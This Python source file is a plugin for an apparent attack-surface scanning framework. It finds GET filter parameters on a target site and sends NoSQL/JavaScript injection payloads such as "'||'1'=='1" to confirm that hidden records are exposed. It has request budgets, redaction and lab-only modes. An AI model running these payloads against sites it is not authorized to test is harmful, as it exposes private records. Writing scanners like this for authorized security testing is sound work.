"""Closed URL-only NoSQL syntax-injection differential probe (#1292).

The first calibrated mode is deliberately GET-only.  Starting from a workflow
root URL, the probe discovers same-origin filter/search links, owns every
payload, and confirms a stable hidden-record expansion with syntax and boolean
controls.  The model never supplies an endpoint, parameter, baseline value, or
payload.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import secrets
import socket
import ssl
from html.parser import HTMLParser
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit

from plugin_interface import ToolPlugin
from tools.web_request_smuggling_probe import read_http_response


MODE = "syntax-filter-differential-v1"
RUNTIME_PROOF = "runtime-read-only"
LAB_PROOF = "lab-state-change"
USER_AGENT = "xASM-NoSQL-Injection-Probe/1.0"
MAX_REQUEST_BUDGET = 32
MAX_BODY_BYTES = 250_000
MAX_EVIDENCE_CHARS = 96_000
FILTER_PARAMETER_NAMES = {
    "category",
    "filter",
    "q",
    "query",
    "search",
    "tag",
    "term",
}
UNSAFE_PATH_RE = re.compile(
    r"(?:^|/)(?:login|logout|signout|checkout|purchase|cart|delete|destroy|remove|"
    r"update|edit|reset|forgot-password)(?:/|$)",
    re.I,
)
ERROR_MARKERS = (
    "syntaxerror",
    "invalid or unexpected token",
    "unterminated string",
    "unexpected end of input",
    "mongodb",
    "mongoose",
    "$where",
)
SENSITIVE_HEADER_RE = re.compile(
    r"(?im)^(authorization|cookie|set-cookie|proxy-authorization|x-api-key|"
    r"x-csrf-token|x-xsrf-token)\s*:.*$"
)
EMAIL_RE = re.compile(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b")
TOKEN_RE = re.compile(r"\b(?:eyJ[A-Za-z0-9_-]{20,}|[A-Za-z0-9_+/.=-]{48,})\b")
ENTITY_ID_RE = re.compile(r"(?i)(?:^|[_-])(?:id|identifier)$|^(?:product|item|post|record|user)id$")


class _LinkParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.hrefs: List[str] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        if tag.lower() != "a":
            return
        for name, value in attrs:
            if str(name).lower() == "href" and value:
                self.hrefs.append(str(value).strip())


def _sha(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()


def _bounded_int(value: Any, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(int(value), high))
    except (TypeError, ValueError):
        return default


def _validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > 4096 or any(ch in raw for ch in "\r\n\0"):
        return None
    try:
        parsed = urlsplit(raw)
    except ValueError:
        return None
    if (
        parsed.scheme not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
    ):
        return None
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"


def _origin(url: str) -> str:
    parsed = urlsplit(url)
    return f"{parsed.scheme}://{parsed.netloc}/"


def _same_origin(left: str, right: str) -> bool:
    return _origin(left).rstrip("/") == _origin(right).rstrip("/")


def _marker(value: str) -> str:
    return f"[REDACTED sha256={_sha(value)} len={len(value)}]"


def _redact(value: str) -> str:
    safe = str(value or "").replace("\0", "")
    safe = SENSITIVE_HEADER_RE.sub(lambda match: f"{match.group(1)}: <redacted-runtime-secret>", safe)
    preserved_hosts: List[Tuple[str, str]] = []
    for index, match in enumerate(
        re.finditer(r"(?im)^Host:\s*([A-Za-z0-9.-]+(?::[0-9]{1,5})?)\s*$", safe)
    ):
        host = match.group(1)
        sentinel = f"<xasm-nosql-host-{index}>"
        if host not in [row[0] for row in preserved_hosts]:
            preserved_hosts.append((host, sentinel))
            safe = safe.replace(f"Host: {host}", f"Host: {sentinel}")
    preserved_controls: List[Tuple[str, str]] = []
    for index, match in enumerate(re.finditer(r"/\.xasm-nosql-negative-[0-9a-f]{24}", safe)):
        path = match.group(0)
        sentinel = f"<xasm-nosql-control-{index}>"
        if path not in [row[0] for row in preserved_controls]:
            preserved_controls.append((path, sentinel))
            safe = safe.replace(path, sentinel)
    safe = EMAIL_RE.sub(lambda match: _marker(match.group(0)), safe)
    safe = TOKEN_RE.sub(lambda match: _marker(match.group(0)), safe)
    for host, sentinel in preserved_hosts:
        safe = safe.replace(sentinel, host)
    for path, sentinel in preserved_controls:
        safe = safe.replace(sentinel, path)
    return safe[:MAX_EVIDENCE_CHARS]


def _response_has_error(status: int, body: str) -> bool:
    lower = str(body or "").lower()
    return status >= 500 or any(marker in lower for marker in ERROR_MARKERS)


def _entity_keys(body: str, base_url: str) -> Set[str]:
    parser = _LinkParser()
    try:
        parser.feed(str(body or "")[:MAX_EVIDENCE_CHARS])
    except Exception:
        return set()
    found: Set[str] = set()
    for raw in parser.hrefs[:500]:
        absolute = urljoin(base_url, raw)
        if not _same_origin(base_url, absolute):
            continue
        parsed = urlsplit(absolute)
        for name, value in parse_qsl(parsed.query, keep_blank_values=True)[:20]:
            if value and ENTITY_ID_RE.search(name):
                found.add(f"{parsed.path}?{name.lower()}={value}")
        segments = [segment for segment in parsed.path.split("/") if segment]
        if len(segments) >= 2 and re.fullmatch(r"[A-Za-z0-9_-]{1,80}", segments[-1]):
            if re.search(r"(?i)(?:product|item|post|record|user)s?", segments[-2]):
                found.add(f"/{segments[-2].lower()}/{segments[-1]}")
    return found


class WebNoSqlInjectionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:nosql_injection_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers same-origin GET filter parameters from a root URL and confirms "
            "NoSQL/JavaScript query syntax injection with repaired-syntax, false, true, "
            "stable-repeat, and baseline-replay controls."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {"type": "string", "enum": [MODE], "default": MODE},
                "proofLevel": {
                    "type": "string",
                    "enum": [RUNTIME_PROOF, LAB_PROOF],
                    "default": RUNTIME_PROOF,
                    "x-workflow-owned": True,
                },
                "engagement": {
                    "type": "string",
                    "enum": ["standard", "aggressive", "lab", "ctf"],
                    "default": "standard",
                    "x-workflow-owned": True,
                },
                "discoverFromTarget": {"type": "boolean", "default": True, "x-workflow-owned": True},
                "candidateBudget": {
                    "type": "integer", "minimum": 1, "maximum": 6, "default": 5,
                    "x-workflow-owned": True,
                },
                "requestBudget": {
                    "type": "integer", "minimum": 9, "maximum": MAX_REQUEST_BUDGET,
                    "default": 32, "x-workflow-owned": True,
                },
                "maxResponseBytes": {
                    "type": "integer", "minimum": 4096, "maximum": MAX_BODY_BYTES,
                    "default": 96000, "x-workflow-owned": True,
                },
                "stopAfterFirstFinding": {"type": "boolean", "default": True, "x-workflow-owned": True},
                "authCookies": {"type": "string", "x-hidden": True, "x-workflow-owned": True},
                "authHeaders": {
                    "type": "object", "additionalProperties": {"type": "string"},
                    "x-hidden": True, "x-workflow-owned": True,
                },
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 3,
            "domain": ["web", "api"],
            "input_type": ["url"],
            "output_type": ["findings"],
            "chainable_after": ["browser:map_app", "param:discover", "katana:"],
            "chainable_before": ["decision:"],
            "taxonomy_domain": ["web", "api"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Prove bounded NoSQL syntax-injection result-set differentials",
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        target = _validate_target(parameters.get("target"))
        if not target:
            return self._error("target must be a credential-free HTTP(S) URL without query or fragment")
        if str(parameters.get("mode") or MODE) != MODE:
            return self._error(f"mode must be {MODE}", target)
        proof_level = str(parameters.get("proofLevel") or RUNTIME_PROOF)
        if proof_level not in {RUNTIME_PROOF, LAB_PROOF}:
            return self._error("unsupported proofLevel", target)
        engagement = str(parameters.get("engagement") or "standard").lower()
        if engagement not in {"standard", "aggressive", "lab", "ctf"}:
            return self._error("unsupported engagement", target)
        if proof_level == LAB_PROOF and engagement not in {"lab", "ctf"}:
            return self._error("lab-state-change proof requires lab or ctf engagement", target)

        auth_headers, auth_error = self._auth_context(parameters)
        if auth_error:
            return self._error(auth_error, target)
        self._auth_headers = auth_headers
        auth_material = "\n".join(f"{key.lower()}:{value}" for key, value in sorted(auth_headers.items()))
        self._auth_context_sha = _sha(auth_material or f"anonymous:{_origin(target)}")
        self._target = target
        self._requests = 0
        self._budget = _bounded_int(parameters.get("requestBudget"), 32, 9, MAX_REQUEST_BUDGET)
        self._candidate_budget = _bounded_int(parameters.get("candidateBudget"), 5, 1, 6)
        self._max_body = _bounded_int(parameters.get("maxResponseBytes"), 96000, 4096, MAX_BODY_BYTES)
        self._timeout = 20

        try:
            await self._pin_target(target)
            root = await self._request(target, authenticated=bool(auth_headers))
            root_evidence = self._evidence("nosql-root-baseline", root)
            negative_path = f"/.xasm-nosql-negative-{secrets.token_hex(12)}"
            negative = await self._request(urljoin(_origin(target), negative_path.lstrip("/")), authenticated=bool(auth_headers))
            negative_evidence = self._evidence("nosql-route-negative-control", negative)
            if negative["status"] not in {404, 410}:
                return self._result(target, proof_level, "random same-origin route did not reject cleanly")
            candidates = self._discover_candidates(root["body"], target)
            for endpoint, parameter, baseline_value in candidates[: self._candidate_budget]:
                proof = await self._probe_candidate(
                    endpoint,
                    parameter,
                    baseline_value,
                    authenticated=bool(auth_headers),
                )
                if not proof:
                    continue
                steps = [root_evidence, negative_evidence, *proof["steps"]]
                solved_transition = False
                if proof_level == LAB_PROOF:
                    final_root = await self._request(target, authenticated=bool(auth_headers))
                    steps.append(self._evidence("lab-solved-confirmation", final_root))
                    solved_transition = self._is_unsolved(root["body"]) and self._is_solved(final_root["body"])
                    if not solved_transition:
                        continue

                verification = {
                    "verified": True,
                    "fallback": False,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "endpointUrl": endpoint,
                    "parameterName": parameter,
                    "baselineValueSha256": _sha(baseline_value),
                    "baselineValueLength": len(baseline_value),
                    "syntaxBreakObserved": True,
                    "syntaxRepairMatched": True,
                    "falseControlRejected": True,
                    "resultSetExpanded": True,
                    "repeatStable": True,
                    "baselineReplayStable": True,
                    "baselineEntityCount": len(proof["baseline_keys"]),
                    "falseEntityCount": len(proof["false_keys"]),
                    "trueEntityCount": len(proof["true_keys"]),
                    "expandedEntityCount": len(proof["true_keys"] - proof["baseline_keys"]),
                    "requestCount": self._requests,
                    "authContextSha256": self._auth_context_sha,
                    "networkDestinationPreserved": True,
                    "destinationIpPinned": True,
                    "tlsSniPreserved": urlsplit(target).scheme == "https",
                    "labSolvedTransition": solved_transition,
                    "nosqlEvidence": {"version": 1, "steps": steps},
                }
                finding = self._finding(endpoint, parameter, proof, verification)
                return {
                    "success": True,
                    "tool": self.name,
                    "target": target,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "verified": True,
                    "fallback": False,
                    "requestCount": self._requests,
                    "findings": [finding],
                    "total_findings": 1,
                    "verification": verification,
                    "summary": {
                        "verified": True,
                        "parameter": parameter,
                        "baselineEntities": len(proof["baseline_keys"]),
                        "expandedEntities": len(proof["true_keys"] - proof["baseline_keys"]),
                        "requests": self._requests,
                        "fallback": False,
                    },
                }
            return self._result(target, proof_level, "no stable NoSQL syntax differential was proven")
        except Exception as exc:
            return self._error(str(exc)[:300], target)

    def _auth_context(self, parameters: Dict[str, Any]) -> Tuple[Dict[str, str], Optional[str]]:
        output: Dict[str, str] = {}
        raw_headers = parameters.get("authHeaders")
        if raw_headers is not None and not isinstance(raw_headers, dict):
            return {}, "authHeaders must be a workflow-owned object"
        for name, value in (raw_headers or {}).items():
            key = str(name or "").strip()
            text = str(value or "").strip()
            if not key or not text or any(ch in key + text for ch in "\r\n\0"):
                return {}, "invalid workflow-owned authentication header"
            if key.lower() not in {"authorization", "x-api-key"}:
                return {}, "unsupported workflow-owned authentication header"
            output[key] = text
        cookie = parameters.get("authCookies")
        if cookie:
            text = str(cookie).strip()
            if any(ch in text for ch in "\r\n\0"):
                return {}, "invalid workflow-owned cookie"
            output["Cookie"] = text
        return output, None

    def _discover_candidates(self, body: str, base_url: str) -> List[Tuple[str, str, str]]:
        parser = _LinkParser()
        try:
            parser.feed(str(body or "")[: self._max_body])
        except Exception:
            return []
        ranked: List[Tuple[int, str, str, str]] = []
        seen: Set[Tuple[str, str]] = set()
        # #1870 — the coordinator may select a persisted parameterized URL as
        # the server-owned entrypoint. Treat that URL itself as the first
        # candidate instead of requiring the response body to link back to it.
        for raw in [base_url, *parser.hrefs[:300]]:
            endpoint = urljoin(base_url, raw)
            if not _same_origin(base_url, endpoint):
                continue
            parsed = urlsplit(endpoint)
            if UNSAFE_PATH_RE.search(parsed.path) or not parsed.query:
                continue
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            for name, value in pairs[:20]:
                lower = name.lower()
                if (
                    lower not in FILTER_PARAMETER_NAMES
                    or not value
                    or len(value) > 80
                    or any(ch in value for ch in "\r\n\0'$\\")
                ):
                    continue
                key = (endpoint, name)
                if key in seen:
                    continue
                seen.add(key)
                rank = 0 if lower == "category" else 1 if lower in {"filter", "search"} else 2
                ranked.append((rank, endpoint, name, value))
        ranked.sort(key=lambda row: (row[0], len(urlsplit(row[1]).path), row[1], row[2]))
        return [(endpoint, name, value) for _rank, endpoint, name, value in ranked]

    async def _probe_candidate(
        self,
        endpoint: str,
        parameter: str,
        baseline_value: str,
        *,
        authenticated: bool,
    ) -> Optional[Dict[str, Any]]:
        baseline = await self._request(endpoint, authenticated=authenticated)
        syntax_break = await self._request(
            self._mutate(endpoint, parameter, baseline_value + "'"), authenticated=authenticated
        )
        syntax_repair = await self._request(
            self._mutate(endpoint, parameter, baseline_value + "'+'"), authenticated=authenticated
        )
        false_control = await self._request(
            self._mutate(endpoint, parameter, baseline_value + "'&&'1'=='2"),
            authenticated=authenticated,
        )
        true_proof = await self._request(
            self._mutate(endpoint, parameter, baseline_value + "'||'1'=='1"),
            authenticated=authenticated,
        )
        baseline_keys = _entity_keys(baseline["body"], endpoint)
        repair_keys = _entity_keys(syntax_repair["body"], endpoint)
        false_keys = _entity_keys(false_control["body"], endpoint)
        true_keys = _entity_keys(true_proof["body"], endpoint)
        if (
            baseline["status"] != 200
            or syntax_repair["status"] != 200
            or false_control["status"] != 200
            or true_proof["status"] != 200
            or not _response_has_error(syntax_break["status"], syntax_break["body"])
            or _response_has_error(syntax_repair["status"], syntax_repair["body"])
            or len(baseline_keys) < 1
            or repair_keys != baseline_keys
            or false_keys
            or len(true_keys) < len(baseline_keys) + 2
            or len(true_keys - baseline_keys) < 2
        ):
            return None
        true_repeat = await self._request(true_proof["url"], authenticated=authenticated)
        baseline_replay = await self._request(endpoint, authenticated=authenticated)
        repeat_keys = _entity_keys(true_repeat["body"], endpoint)
        replay_keys = _entity_keys(baseline_replay["body"], endpoint)
        if (
            true_repeat["status"] != 200
            or baseline_replay["status"] != 200
            or repeat_keys != true_keys
            or replay_keys != baseline_keys
        ):
            return None
        return {
            "baseline_keys": baseline_keys,
            "false_keys": false_keys,
            "true_keys": true_keys,
            "steps": [
                self._evidence("nosql-parameter-baseline", baseline),
                self._evidence("nosql-syntax-break-control", syntax_break),
                self._evidence("nosql-syntax-repair-control", syntax_repair),
                self._evidence("nosql-boolean-false-control", false_control),
                self._evidence("nosql-boolean-true-proof", true_proof),
                self._evidence("nosql-boolean-true-repeat", true_repeat),
                self._evidence("nosql-baseline-replay", baseline_replay),
            ],
        }

    async def _pin_target(self, target: str) -> None:
        parsed = urlsplit(target)
        host = str(parsed.hostname or "")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        addresses = await asyncio.wait_for(
            asyncio.get_running_loop().getaddrinfo(host, port, type=socket.SOCK_STREAM),
            20,
        )
        if not addresses:
            raise OSError("target DNS resolution returned no addresses")
        family, _type, _proto, _canon, sockaddr = addresses[0]
        self._hostname = host
        self._port = port
        self._family = family
        self._pinned_ip = str(sockaddr[0])

    async def _request(self, url: str, *, authenticated: bool) -> Dict[str, Any]:
        if self._requests >= self._budget:
            raise ValueError("request budget exhausted")
        parsed = urlsplit(url)
        if not _same_origin(url, self._target):
            raise ValueError("request left authorized origin")
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        host_header = self._hostname
        default_port = 443 if parsed.scheme == "https" else 80
        if self._port != default_port:
            host_header += f":{self._port}"
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {host_header}",
            f"User-Agent: {USER_AGENT}",
            "Accept: text/html, application/json;q=0.8",
            "Accept-Encoding: identity",
            "Cache-Control: no-store",
            "Connection: close",
        ]
        if authenticated:
            lines.extend(f"{key}: {value}" for key, value in self._auth_headers.items())
        raw = ("\r\n".join(lines) + "\r\n\r\n").encode()
        ssl_context = ssl.create_default_context() if parsed.scheme == "https" else None
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host=self._pinned_ip,
                port=self._port,
                family=self._family,
                ssl=ssl_context,
                server_hostname=self._hostname if ssl_context else None,
            ),
            self._timeout,
        )
        self._requests += 1
        try:
            writer.write(raw)
            await writer.drain()
            response = await read_http_response(reader, self._timeout)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, ssl.SSLError):
                pass
        body_bytes = bytes(response.get("bodyBytes") or b"")
        if len(body_bytes) > self._max_body:
            raise ValueError("response exceeded bounded body limit")
        return {
            "url": url,
            "rawRequest": raw.decode("utf-8", "replace"),
            "status": int(response["status"]),
            "headerText": str(response.get("headerText") or ""),
            "body": str(response.get("body") or ""),
        }

    def _evidence(self, label: str, observation: Dict[str, Any]) -> Dict[str, Any]:
        raw_lines = observation["rawRequest"].split("\r\n")
        request = "\r\n".join(
            line
            for line in raw_lines
            if not line.lower().startswith(("authorization:", "cookie:", "x-api-key:"))
        )
        request = _redact(request)
        body = _redact(observation["body"])
        content_type_match = re.search(
            r"(?im)^content-type:\s*([^\r\n]+)", observation["headerText"]
        )
        content_type = content_type_match.group(1).strip() if content_type_match else "text/html; charset=utf-8"
        response = (
            f"HTTP/1.1 {observation['status']} Xasm\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(body.encode())}\r\n"
            "Cache-Control: no-store\r\n\r\n"
            + body
        )
        return {
            "label": label,
            "url": observation["url"],
            "request": request,
            "requestSha256": _sha(request),
            "response": response,
            "responseSha256": _sha(response),
            "responseBodySha256": _sha(body),
            "responseBodyLength": len(body.encode()),
            "responseStatus": observation["status"],
            "responseExcerptTruncated": False,
            "authContextSha256": self._auth_context_sha,
        }

    def _mutate(self, endpoint: str, parameter: str, value: str) -> str:
        parsed = urlsplit(endpoint)
        pairs = parse_qsl(parsed.query, keep_blank_values=True)
        mutated: List[Tuple[str, str]] = []
        replaced = False
        for name, current in pairs:
            if name == parameter and not replaced:
                mutated.append((name, value))
                replaced = True
            else:
                mutated.append((name, current))
        if not replaced:
            raise ValueError("observed parameter disappeared from candidate URL")
        return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(mutated), ""))

    def _is_unsolved(self, body: str) -> bool:
        lower = str(body or "").lower()
        return "is-notsolved" in lower and "is-solved" not in lower

    def _is_solved(self, body: str) -> bool:
        lower = str(body or "").lower()
        return "is-solved" in lower and "is-notsolved" not in lower

    def _finding(
        self,
        endpoint: str,
        parameter: str,
        proof: Dict[str, Any],
        verification: Dict[str, Any],
    ) -> Dict[str, Any]:
        decisive = next(
            step for step in proof["steps"] if step["label"] == "nosql-boolean-true-proof"
        )
        return {
            "template-id": "xasm-nosql-syntax-filter-differential-verified",
            "matcher-name": "stable-hidden-record-result-set-expansion",
            "matched-at": endpoint,
            "host": _origin(endpoint).rstrip("/"),
            "type": "http",
            "request": decisive["request"],
            "response": decisive["response"],
            "evidence": verification,
            "extracted-results": [
                f"parameter:{parameter}",
                f"baseline-entities:{len(proof['baseline_keys'])}",
                f"expanded-entities:{len(proof['true_keys'] - proof['baseline_keys'])}",
            ],
            "info": {
                "name": "NoSQL Syntax Injection Exposes Hidden Records",
                "severity": "high",
                "description": (
                    "A GET filter accepted JavaScript-style query syntax. A repaired control "
                    "matched the baseline, the false predicate returned no objects, and the "
                    "true predicate repeatedly exposed additional records."
                ),
                "remediation": (
                    "Use typed query parameters and driver/ODM equality operators; never concatenate "
                    "request values into $where or server-side JavaScript expressions."
                ),
                "classification": {"cwe-id": ["CWE-943", "CWE-200"]},
            },
        }

    def _result(self, target: str, proof_level: str, reason: str) -> Dict[str, Any]:
        verification = {
            "verified": False,
            "fallback": False,
            "mode": MODE,
            "proofLevel": proof_level,
            "requestCount": self._requests,
            "reason": reason,
            "networkDestinationPreserved": True,
            "destinationIpPinned": True,
            "tlsSniPreserved": urlsplit(target).scheme == "https",
        }
        return {
            "success": True,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "proofLevel": proof_level,
            "verified": False,
            "fallback": False,
            "requestCount": self._requests,
            "findings": [],
            "total_findings": 0,
            "verification": verification,
            "summary": {"requests": self._requests, "findings": 0, "fallback": False},
        }

    def _error(self, message: str, target: Optional[str] = None) -> Dict[str, Any]:
        return {
            "success": False,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "verified": False,
            "fallback": False,
            "error": message,
            "findings": [],
        }


def get_tool() -> WebNoSqlInjectionProbeTool:
    return WebNoSqlInjectionProbeTool()
